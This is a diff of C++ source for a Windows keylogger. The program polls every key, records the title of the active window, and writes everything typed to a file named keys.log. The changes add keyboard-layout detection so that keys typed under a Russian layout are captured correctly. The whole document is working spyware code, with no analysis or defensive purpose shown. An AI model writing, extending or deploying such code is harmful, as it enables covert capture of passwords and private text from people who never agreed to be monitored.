@@ -39,13 +39,23 @@ const char filename[] = "keys.log";
 int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 {
   string lastTitle = "";
+  char d;
   ofstream ofs(filename);
+
+  wchar_t wChar;
+  char title[1024];
+  byte lpKeyboard[256];
+  DWORD processId;
+  HWND hwnd;
+  HKL kLayout;
+
+  WORD rusLangId = MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT);
 
   while(true)
   {
     Sleep(1);
-    char title[1024];
-    HWND hwnd = GetForegroundWindow();
+
+    hwnd = GetForegroundWindow();
     GetWindowText(hwnd, title, 1023);
     if(lastTitle != title)
     {
@@ -59,6 +69,8 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
       ofs << endl << "Keys:";
       lastTitle = title;
     }
+
+    kLayout = GetKeyboardLayout(GetWindowThreadProcessId(hwnd, &processId));
 
     for(unsigned char c = 1; c < 255; c++)
     {
@@ -204,7 +216,10 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
           break;
 
         case VK_OEM_COMMA:
-          ofs << ",";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "á";
+          else
+            ofs << ",";
           break;
 
         case VK_OEM_MINUS:
@@ -212,7 +227,10 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
           break;
 
         case VK_OEM_PERIOD:
-          ofs << ".";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "þ";
+          else
+            ofs << ".";
           break;
 
         case VK_APPS:
@@ -220,7 +238,10 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
           break;
 
         case VK_OEM_1:
-          ofs <<";";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "æ";
+          else
+            ofs << ";";
           break;
 
         case VK_OEM_2:
@@ -232,7 +253,10 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
           break;
 
         case VK_OEM_4:
-          ofs << "[";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "õ";
+          else
+            ofs << "[";
           break;
 
         case VK_OEM_5:
@@ -240,18 +264,29 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
           break;
 
         case VK_OEM_6:
-          ofs << "]";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "ú";
+          else
+            ofs << "]";
           break;
 
         case VK_OEM_7:
-          ofs << "'";
+          if(LOWORD(kLayout) == rusLangId)
+            ofs << "ý";
+          else
+            ofs << "'";
           break;
 
         default:
           if ( (c >= 0x41 && c <= 0x5A) || 
                (c >= 0x30 && c <= 0x39) || 
                (c == VK_SPACE) )
-            ofs << c;
+          {
+            GetKeyboardState(lpKeyboard);
+            ToUnicodeEx(c, MapVirtualKey(c, 0), lpKeyboard, &wChar, 2, 0, kLayout);
+            WideCharToMultiByte(CP_ACP, 0,  &wChar, -1, &d, 1, NULL, NULL);
+            ofs << d;
+          }
           else if (c >= VK_NUMPAD0 && c <= VK_NUMPAD9)
             ofs << "<NUM " << (c - 96) << ">";
           else if (c >= VK_F1 && c <= VK_F12)
